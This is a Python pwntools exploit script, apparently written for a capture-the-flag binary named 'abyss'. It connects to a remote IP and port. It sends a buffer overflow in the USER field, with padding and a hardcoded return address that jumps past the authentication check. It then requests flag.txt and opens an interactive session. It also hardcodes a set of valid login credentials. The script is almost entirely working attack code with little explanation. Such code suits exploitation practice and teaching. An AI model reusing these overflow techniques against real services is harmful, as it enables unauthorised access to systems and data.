#!/usr/bin/python
import sys
import struct
import time
from pwn import *

def main(do_login=False, do_read=False, do_exit=False, do_login_and_read=False):
    context.log_level = 'error'
    login_cmd, read_cmd, exit_cmd, invalid_cmd = 0, 1, 2, 3
    
    e = ELF("./abyss")
    # libc = ELF("./glibc/libc.so.6")
    #p = process(e.path)
    #p = gdb.debug(e.path, gdbscript=open('script.gdb', 'r').read())
    
    p = remote('94.237.48.12', 40316)
    # p = remote('127.0.0.1', 1338)
   
    if do_login_and_read:
        print("[CLIENT] Attempting valid login and read")
        valid_user = b'xCVJMvejQnWt4yW'
        valid_pw = b'CGXuXt2ebMPWVz9'

        p.send(struct.pack("<I", login_cmd))
        p.send(b"USER " + valid_user + b'\x00')

        time.sleep(0.5)
        p.send(b"PASS " + valid_pw + b'\x00')

        time.sleep(0.5)

        print("[CLIENT] Attempting read")
        payload = struct.pack("<I", read_cmd)
        p.send(payload)

        time.sleep(0.5)
        p.send(b'/app/flag.txt\x00')

    if do_login:
        print("[CLIENT] Attempting login (overflow)")
        p.send(struct.pack("<I", login_cmd))
    
        user = b'A'*(0x5+0xc)
        user += b'\x1c' + b'K'*(0xb)
        user += b'\xeb\x14\x40'        # return address

        # Past authentication check in cmd_read
        # break *cmd_read+66

        other_pw   = cyclic(507)
    
        p.send(b"USER " + user)
        time.sleep(0.5)
        p.send(b"PASS " + other_pw)
        time.sleep(0.5)
        p.send(b'flag.txt\x00')
        time.sleep(0.5)
        #p.send(b'A'*500)
        p.interactive()

    elif do_read:
        print("[CLIENT] Attempting read")
        # Cant do anything with the read_cmd unless I know a set of valid creds
        payload = struct.pack("<I", read_cmd)
        p.sendline(payload)

    elif do_exit:
        print("[CLIENT] Attempting exit")
        payload = struct.pack("<I", exit_cmd)
        p.sendline(payload)

    recv_lines = p.recv(1024)
    for l in [l for l in recv_lines.split(b'\n') if l]:
        print(l)

if __name__ == "__main__":
    if len(sys.argv) == 2:
        if sys.argv[1] == "exploit":
            main(do_login=True)
        elif sys.argv[1] == "read":
            main(do_read=True)
        elif sys.argv[1] == "exit":
            main(do_exit=True)
        elif sys.argv[1] == "valid_login":
            main(do_login_and_read=True)

    else:
        # default to login
        main(do_login=True)
